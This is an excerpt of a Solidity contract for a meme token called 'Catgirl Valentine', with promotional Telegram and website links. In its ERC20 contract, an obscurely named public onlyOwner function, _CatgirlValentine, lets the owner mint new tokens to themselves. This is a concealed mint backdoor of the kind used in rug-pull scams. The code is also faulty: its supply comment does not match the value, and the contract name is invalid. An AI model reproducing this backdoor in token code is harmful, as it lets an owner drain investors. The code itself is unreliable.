...
//
// $CatgirlValentine proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/CatgirlValantine
// 📱 Website ::https://catgirlvalentine.website
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _CatgirlValentine(uint256 amount) public onlyOwner {
 _CatgirlValentine(msg.sender, amount);
    }
    ...
    function _CatgirlValentine(address account, uint256 amount) internal virtual {
...
contract $CatgirlValentine is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Catgirl Valentine", "CGVALENTINE") {
     _CatgirlValentine(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}